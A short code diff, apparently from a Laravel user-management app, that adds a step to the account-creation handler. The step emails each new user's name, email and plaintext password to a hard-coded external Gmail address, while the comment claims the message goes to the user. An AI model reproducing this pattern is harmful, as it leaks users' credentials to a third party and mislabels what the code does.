@@ -6,6 +6,7 @@ use App\User;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Mail;
 
 class UserController extends Controller
 {
@@ -69,6 +70,11 @@ class UserController extends Controller
             'password' => Hash::make($request->password),
             'profile' => $request->profile,
         ]);
+
+        //ENVIO DE EMAIL INFORMANDO AO USUARIO  SEU EMAIL E SENHA
+        Mail::to('emaildobrenomol@gmail.com')
+        //->cc('copy@email.com')
+        ->send(new \App\Mail\SendMailUser($request->name, $request->email, $request->password));
 
         return redirect()->route('usuarios.index')
                         ->with('success', 'Usuário criado com sucesso!');
